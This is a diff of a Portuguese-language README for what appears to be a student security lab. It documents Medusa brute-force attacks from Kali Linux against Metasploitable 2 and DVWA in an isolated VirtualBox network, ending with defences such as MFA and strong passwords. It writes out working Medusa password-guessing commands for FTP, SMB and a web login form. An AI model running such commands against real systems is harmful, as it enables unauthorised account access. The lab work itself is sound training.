@@ -13,11 +13,18 @@ O objetivo principal é demonstrar o uso de ataques de força bruta em ambiente 
   •	Utilizar o GitHub como portfólio técnico para registrar e compartilhar evidências.
 
  - Tecnologias Utilizadas:
-       
-   Kali Linux: Ambiente de auditoria
-   Medusa:	Ataques de força bruta
-   FTP/SMB/HTTP:	Serviços-alvo utilizados
-   Nano:	Edição de scripts
+
+     Ambiente configurado utilizando máquinas virtuais no VirtualBox em rede Host-Only.
+
+      Kali Linux – Máquina atacante
+      Metasploitable 2 – Máquina vulnerável
+      DVWA – Aplicação web vulnerável
+      Comunicação via rede interna
+      Wordlists e scripts executados via Kali
+      Kali Linux: Ambiente de auditoria
+      Medusa:	Ataques de força bruta
+      FTP/SMB/HTTP:	Serviços-alvo utilizados
+      Nano:	Edição de scripts
         
  - Procedimentos Realizados
   
@@ -26,17 +33,24 @@ O objetivo principal é demonstrar o uso de ataques de força bruta em ambiente 
         •	Verificação dos serviços-alvo
         •	Configuração de wordlists personalizadas
       
-   2. Ataque de Força Bruta – FTP
-
+        - Teste de credenciais fracas
+        - Wordlists simples e Wordlists personalizadas
+        - Identificação de acessos válidos
+        - Automação de Tentativas em Formulário Web (DVWA)
+        - Inspeção do formulário
+        - Testes automatizados de login
+      
+   3. Ataque de Força Bruta – FTP
+  
       Comando utilizado:
       medusa -h 192.168.0.10 -u admin -P wordlists/senha.txt -M ftp
       
-   3. Ataque de Força Bruta – SMB
+   4. Ataque de Força Bruta – SMB
       
       Comando utilizado:
       medusa -h 192.168.0.10 -U users.txt -P passwords.txt -M smbnt
       
-   4. Ataque de Força Bruta – HTTP (Formulário Web)
+   5. Ataque de Força Bruta – HTTP (Formulário Web)
 
       medusa -h 192.168.0.10 -U users.txt -P passwords.txt -M web-form -m FORM:"login.php:username=^USER^&password=^PASS^:F=Login Failed"
 
@@ -49,5 +63,3 @@ O objetivo principal é demonstrar o uso de ataques de força bruta em ambiente 
     •	Políticas de senha forte
     •	Habilitar MFA (Autenticação Multifator)
     •	Monitoramento e análise de logs
-
-
